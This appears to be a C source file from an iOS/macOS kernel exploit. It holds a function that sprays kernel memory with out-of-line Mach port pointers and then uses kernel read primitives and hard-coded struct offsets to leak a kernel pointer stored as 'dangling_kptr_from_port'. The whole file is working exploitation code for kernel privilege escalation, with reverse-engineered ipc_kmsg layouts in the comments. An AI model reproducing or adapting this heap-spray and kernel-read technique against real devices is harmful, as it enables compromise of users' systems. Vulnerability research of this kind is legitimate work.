#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <stdlib.h>

#include "ool.h"
#include "helper.h"
#include "find_port.h"
#include "krw.h"

uint64_t dangling_kptr_from_port = 0;

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }

// (lldb) p/x offsetof(struct ipc_port, ip_messages)
// (unsigned long) $3 = 0x0000000000000010

// 00000000 struct __attribute__((aligned(8))) ipc_mqueue::$2E0228C480B494B3768A87C5A9B2CB97::$C897FC1EFAC1BB0E6F68B660AC1584BD // sizeof=0x48
// 00000000 {                                       // XREF: ipc_mqueue::$2E0228C480B494B3768A87C5A9B2CB97/r
// 00000000     waitq_0 waitq;
// 00000030     ipc_kmsg_queue messages; <- THIS !!!!
// 00000038     mach_port_seqno_t seqno;
// 0000003C     mach_port_name_t_0 receiver_name;
// 00000040     uint16_t msgcount;
// 00000042     uint16_t qlimit;
// 00000044     // padding byte
// 00000045     // padding byte
// 00000046     // padding byte
// 00000047     // padding byte
// 00000048 };

// 00000000 struct ipc_kmsg_queue // sizeof=0x8
// 00000000 {                                       // XREF: ipc_mqueue::$2E0228C480B494B3768A87C5A9B2CB97::$C897FC1EFAC1BB0E6F68B660AC1584BD/r
// 00000000                                         // thread_0/r ...
// 00000000     ipc_kmsg *ikmq_base; <- THIS !!!!
// 00000008 };

// 00000000 struct ipc_kmsg // sizeof=0x58
// 00000000 {
// 00000000     mach_msg_size_t ikm_size;
// 00000004     // padding byte
// 00000005     // padding byte
// 00000006     // padding byte
// 00000007     // padding byte
// 00000008     ipc_kmsg *ikm_next;
// 00000010     ipc_kmsg *ikm_prev;
// 00000018     mach_msg_header_t_0 *ikm_header;
// 00000020     ipc_port_t_1 ikm_prealloc;
// 00000028     ipc_port_t_1 ikm_voucher;
// 00000030     mach_msg_priority_t ikm_qos;
// 00000034     mach_msg_priority_t ikm_qos_override;
// 00000038     ipc_importance_elem *ikm_importance;
// 00000040     queue_chain_t_0 ikm_inheritance;
// 00000050     turnstile *ikm_turnstile;
// 00000058 };

    // 0x10+0x30 = 0x40 = off_ipc_port_ikmq_base
    uint32_t off_ipc_port_ikmq_base = 0x40;

    uint64_t port_kaddr = find_port_address(q);
    INFO("port_kaddr: 0x%llx\n", port_kaddr);

    uint64_t ikmq_base = kread64(port_kaddr + off_ipc_port_ikmq_base);
    INFO("ikmq_base: 0x%llx\n", ikmq_base);

    uint32_t off_ipc_kmsg_ikm_header = 0x18; // p/x offsetof(struct ipc_kmsg, ikm_header)
    uint64_t ikm_header = kread64(ikmq_base+off_ipc_kmsg_ikm_header);
    // khexdump(ikm_header, 0x200);

    //mach_msg_ool_ports_descriptor_t->address
    uint64_t off_mach_msg_ool_ports_desc_address = 0x24;

    dangling_kptr_from_port = kread64(ikm_header + off_mach_msg_ool_ports_desc_address);
    
    return q;
}